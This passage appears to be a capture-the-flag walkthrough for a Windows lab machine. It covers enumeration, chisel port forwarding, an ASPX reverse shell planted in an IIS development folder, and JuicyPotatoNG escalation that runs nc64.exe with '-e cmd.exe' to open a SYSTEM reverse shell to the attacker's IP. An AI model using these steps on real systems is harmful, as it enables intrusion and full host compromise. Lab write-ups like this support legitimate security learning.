+  TCP    [::]:8000              g0:0                   LISTENING
+  TCP    [::]:9389              g0:0                   LISTENING
+  TCP    [::]:47001             g0:0                   LISTENING
+  TCP    [::]:49664             g0:0                   LISTENING
+  TCP    [::]:49665             g0:0                   LISTENING
+  TCP    [::]:49666             g0:0                   LISTENING
+  TCP    [::]:49667             g0:0                   LISTENING
+  TCP    [::]:49673             g0:0                   LISTENING
+  TCP    [::]:49674             g0:0                   LISTENING
+  TCP    [::]:49687             g0:0                   LISTENING
+  TCP    [::]:49690             g0:0                   LISTENING
+  TCP    [::]:49699             g0:0                   LISTENING
+  TCP    [::1]:53               g0:0                   LISTENING
+  TCP    [dead:beef::23d]:53    g0:0                   LISTENING
+  TCP    [dead:beef::132:e7f4:d0b6:bf81]:53  g0:0                   LISTENING
+  TCP    [fe80::132:e7f4:d0b6:bf81%6]:53  g0:0                   LISTENING
+
+
+
+
+
+
+
+
+  TCP    0.0.0.0:8000           g0:0                   LISTENING
+
+
+I didn't find this port from outside 
+
+Invoke-WebRequest -URI https://127.0.0.1:8000/
+
+
+
+PS C:\users\c.bum\desktop> Invoke-WebRequest -URI http://127.0.0.1:8000/ -UseBasicParsing
+Invoke-WebRequest -URI http://127.0.0.1:8000/ -UseBasicParsing
+
+
+StatusCode        : 200
+StatusDescription : OK
+Content           : <!DOCTYPE html>
+                    <html>
+                        <head>
+                            <meta charset="utf-8">
+                            <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+                    <!--
+                    
+                    Template 2093 Flight
+                    
+                    http://www.tooplate.com/vie...
+RawContent        : HTTP/1.1 200 OK
+                    Accept-Ranges: bytes
+                    Content-Length: 45949
+                    Content-Type: text/html
+                    Date: Wed, 25 Jan 2023 23:29:17 GMT
+                    ETag: "03cf42dc9d5d31:0"
+                    Last-Modified: Mon, 16 Apr 2018 21:23:36 GMT
+                    Serv...
+Forms             : 
+Headers           : {[Accept-Ranges, bytes], [Content-Length, 45949], [Content-Type, text/html], [Date, Wed, 25 Jan 
+                    2023 23:29:17 GMT]...}
+Images            : {@{outerHTML=<img src="img/logo.png" alt="Flight Template">; tagName=IMG; src=img/logo.png; 
+                    alt=Flight Template}, @{outerHTML=<img src="img/weather-icon-03.png" alt="">; tagName=IMG; 
+                    src=img/weather-icon-03.png; alt=}, @{outerHTML=<img src="img/weather-icon-02.png" alt="">; 
+                    tagName=IMG; src=img/weather-icon-02.png; alt=}, @{outerHTML=<img src="img/weather-icon-01.png" 
+                    alt="">; tagName=IMG; src=img/weather-icon-01.png; alt=}...}
+InputFields       : {}
+Links             : {@{outerHTML=<a href="http://facebook.com">Find us on <em>Facebook</em><i class="fa 
+                    fa-facebook"></i></a>; tagName=A; href=http://facebook.com}, @{outerHTML=<a 
+                    href="http://youtube.com">Our <em>YouTube</em> Channel<i class="fa fa-youtube"></i></a>; 
+                    tagName=A; href=http://youtube.com}, @{outerHTML=<a href="http://instagram.com">Follow our 
+                    <em>instagram</em><i class="fa fa-instagram"></i></a>; tagName=A; href=http://instagram.com}, 
+                    @{outerHTML=<a href="contact.html"><i class="fa fa-phone"></i>Contact Us Now</a>; tagName=A; 
+                    href=contact.html}...}
+ParsedHtml        : 
+RawContentLength  : 45949
+
+
+It looks like the external website..
+
+check which pid is on port 8000:
+
+PS C:\users\c.bum\desktop> netstat -noa | findstr 8000
+netstat -noa | findstr 8000
+  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
+  TCP    127.0.0.1:50564        127.0.0.1:8000         TIME_WAIT       0
+  TCP    [::]:8000              [::]:0                 LISTENING       4
+  UDP    0.0.0.0:58000          *:*                                    2916
+
+
+pid 4 
+
+
+PS C:\users\c.bum\desktop> Get-Process -Id 4 | Format-List *
+Get-Process -Id 4 | Format-List *
+
+
+Name                       : System
+Id                         : 4
+PriorityClass              : 
+FileVersion                : 
+HandleCount                : 1585
+WorkingSet                 : 122880
+PagedMemorySize            : 196608
+PrivateMemorySize          : 196608
+VirtualMemorySize          : 3911680
+TotalProcessorTime         : 
+SI                         : 0
+Handles                    : 1585
+VM                         : 3911680
+WS                         : 122880
+PM                         : 196608
+NPM                        : 272
+Path                       : 
+Company                    : 
+CPU                        : 
+ProductVersion             : 
+Description                : 
+Product                    : 
+__NounName                 : Process
+BasePriority               : 8
+ExitCode                   : 
+HasExited                  : 
+ExitTime                   : 
+Handle                     : 
+SafeHandle                 : 
+MachineName                : .
+MainWindowHandle           : 0
+MainWindowTitle            : 
+MainModule                 : 
+MaxWorkingSet              : 
+MinWorkingSet              : 
+Modules                    : 
+NonpagedSystemMemorySize   : 272
+NonpagedSystemMemorySize64 : 272
+PagedMemorySize64          : 196608
+PagedSystemMemorySize      : 0
+PagedSystemMemorySize64    : 0
+PeakPagedMemorySize        : 212992
+PeakPagedMemorySize64      : 212992
+PeakWorkingSet             : 720896
+PeakWorkingSet64           : 720896
+PeakVirtualMemorySize      : 13574144
+PeakVirtualMemorySize64    : 13574144
+PriorityBoostEnabled       : 
+PrivateMemorySize64        : 196608
+PrivilegedProcessorTime    : 
+ProcessName                : System
+ProcessorAffinity          : 
+Responding                 : True
+SessionId                  : 0
+StartInfo                  : System.Diagnostics.ProcessStartInfo
+StartTime                  : 
+SynchronizingObject        : 
+Threads                    : {12, 16, 20, 24...}
+UserProcessorTime          : 
+VirtualMemorySize64        : 3911680
+EnableRaisingEvents        : False
+StandardInput              : 
+StandardOutput             : 
+StandardError              : 
+WorkingSet64               : 122880
+Site                       : 
+Container                  : 
+
+
+
+I can't get a lot of processes info
+
+I have to try to interact from kali machine
+
+https://infinitelogins.com/2020/12/11/tunneling-through-windows-machines-with-chisel/
+
+
+attacker machine:
+
+./chisel server --port 8888 --reverse
+
+
+victim:
+
+.\chisel.exe client 10.10.16.5:8888 R:8000:localhost:8000
+not working (bad hostname)
+
+correct command:
+
+.\chisel.exe client 10.10.16.5:8888 R:8001:127.0.0.1:8000
+
+connectoto 
+
+http://127.0.0.1:8001/
+
+
+Now I have access to this internal site, which looks like is run by administrator.
+Now I could try to find the root dir for this site and see what I find.
+
+from whoami/ groups I found out that c.bum is part of the web devs:
+
+flight\WebDevs                             Group            S-1-5-21-4078382237-1492182817-2568127209-1614 Mandatory group, Enabled by default, Enabled group
+
+maybe he has access to this site too 
+
+
+
+PS C:\inetpub> dir
+dir
+
+
+    Directory: C:\inetpub
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        9/22/2022  12:24 PM                custerr                                                               
+d-----        1/26/2023   7:52 AM                development                                                           
+d-----        9/22/2022   1:08 PM                history                                                               
+d-----        9/22/2022  12:32 PM                logs                                                                  
+d-----        9/22/2022  12:24 PM                temp                                                                  
+d-----        9/22/2022  12:28 PM                wwwroot                                                               
+
+
+PS C:\inetpub\wwwroot> dir
+dir
+
+
+    Directory: C:\inetpub\wwwroot
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        9/22/2022  12:28 PM                aspnet_client                                                         
+-a----        9/22/2022  12:24 PM            703 iisstart.htm                                                          
+-a----        9/22/2022  12:24 PM          99710 iisstart.png                                                          
+
+
+PS C:\inetpub\wwwroot> 
+
+I don't have access to all of those folders but I can access wwwroot which I suppose is the root dir for the site
+and I can see it is written in aspx
+
+I can try to create a file here and see if I can see it from the outside
+
+New-Item -Path "C:\inetpub\wwwroot\prova.txt"
+
+
+PS C:\inetpub\wwwroot> New-Item -Path "C:\inetpub\wwwroot\prova.txt"
+New-Item -Path "C:\inetpub\wwwroot\prova.txt"
+New-Item : Access to the path 'C:\inetpub\wwwroot\prova.txt' is denied.
+At line:1 char:1
++ New-Item -Path "C:\inetpub\wwwroot\prova.txt"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\inetpub\wwwroot\prova.txt:String) [New-Item], UnauthorizedAccessEx 
+   ception
+    + FullyQualifiedErrorId : NewItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.NewItemCommand
+
+
+no 
+
+I can try in the other folders, maybe in development
+
+PS C:\inetpub> cd development
+cd development
+PS C:\inetpub\development> dir
+dir
+
+
+    Directory: C:\inetpub\development
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        1/26/2023   7:57 AM                css                                                                   
+d-----        1/26/2023   7:57 AM                fonts                                                                 
+d-----        1/26/2023   7:57 AM                img                                                                   
+d-----        1/26/2023   7:57 AM                js                                                                    
+-a----        4/16/2018   2:23 PM           9371 contact.html                                                          
+-a----        4/16/2018   2:23 PM          45949 index.html
+
+yes I can create the file
+
+PS C:\inetpub\development> New-Item -Path "C:\inetpub\development\prova.txt"
+New-Item -Path "C:\inetpub\development\prova.txt"
+
+
+    Directory: C:\inetpub\development
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        1/26/2023   8:00 AM              0 prova.txt 
+
+
+
+I can access the file! http://127.0.0.1:8001/prova.txt
+
+and if I try to access a non existing file I get:
+
+Detailed Error Information:
+Module	   IIS Web Core
+Notification	   MapRequestHandler
+Handler	   StaticFile
+Error Code	   0x80070002
+Requested URL	   http://127.0.0.1:8000/prova2.txt
+Physical Path	   C:\inetpub\development\prova2.txt
+Logon Method	   Anonymous
+Logon User	   Anonymous
+
+so I am in the right path and can modify it 
+
+now I need a reverse shell in aspx 
+
+I can upload it through smb:
+
+smb: \> put revshell.aspx 
+putting file revshell.aspx as \revshell.aspx (52.0 kb/s) (average 52.0 kb/s)
+smb: \> 
+
+
+then 
+
+PS C:\xampp\htdocs> cp revshell.aspx c:\inetpub\development
+cp revshell.aspx c:\inetpub\development
+PS C:\xampp\htdocs> cd c:\inetpub\development
+cd c:\inetpub\development
+PS C:\inetpub\development> dir
+dir
+
+
+    Directory: C:\inetpub\development
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        1/26/2023   8:07 AM                css                                                                   
+d-----        1/26/2023   8:07 AM                fonts                                                                 
+d-----        1/26/2023   8:07 AM                img                                                                   
+d-----        1/26/2023   8:07 AM                js                                                                    
+-a----        4/16/2018   2:23 PM           9371 contact.html                                                          
+-a----        4/16/2018   2:23 PM          45949 index.html                                                            
+-a----        1/26/2023   8:08 AM          15275 revshell.aspx  
+
+
+127.0.0.1:8001/revshell.aspx
+I get a reverse shell
+
+
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\defaultapppool
+
+
+as apppool
+
+this user has a lot more privileges 
+
+c:\windows\system32\inetsrv>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+I have SeImpersonatePrivilege
+
+https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#seimpersonateprivilege-3.1.1
+
+I can use JuicyPotato
+
+https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1
+
+
+smb: \> put JuicyPotatoNG.exe 
+putting file JuicyPotatoNG.exe as \JuicyPotatoNG.exe (259.1 kb/s) (average 154.5 kb/s)
+smb: \> 
+
+
+PS C:\Users\Public> cp C:\xampp\htdocs\JuicyPotatoNG.exe .
+cp C:\xampp\htdocs\JuicyPotatoNG.exe .
+PS C:\Users\Public> dir
+dir
+
+
+    Directory: C:\Users\Public
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-r---        7/20/2021  12:20 PM                Documents                                                             
+d-r---        9/15/2018  12:19 AM                Downloads                                                             
+d-r---        9/15/2018  12:19 AM                Music                                                                 
+d-r---        9/15/2018  12:19 AM                Pictures                                                              
+d-r---        9/15/2018  12:19 AM                Videos                                                                
+-a----        1/26/2023   8:17 AM         153600 JuicyPotatoNG.exe                                                     
+
+
+PS C:\Users\Public> 
+
+I need nc.exe too
+
+
+PS C:\Users\Public> JuicyPotatoNG.exe -t * -p "c:\users\public\nc64.exe" -a "10.10.16.5 9002 -e cmd.exe"
+
+
+
+
+nc -lvnp 9002            
+listening on [any] 9002 ...
+connect to [10.10.16.5] from (UNKNOWN) [10.10.11.187] 53289
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\>whoami
+whoami
+nt authority\system
+
+C:\>cd c:\users\administrator\desktop
+cd c:\users\administrator\desktop
+
+c:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 1DF4-493D
+
+ Directory of c:\Users\Administrator\Desktop
+
+09/22/2022  12:48 PM    <DIR>          .
+09/22/2022  12:48 PM    <DIR>          ..
+01/25/2023  10:14 AM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   4,604,600,320 bytes free
+
+c:\Users\Administrator\Desktop>type root.txt
+type root.txt
+668450a30078161e10b7c8731f33cd74
+
+c:\Users\Administrator\Desktop>
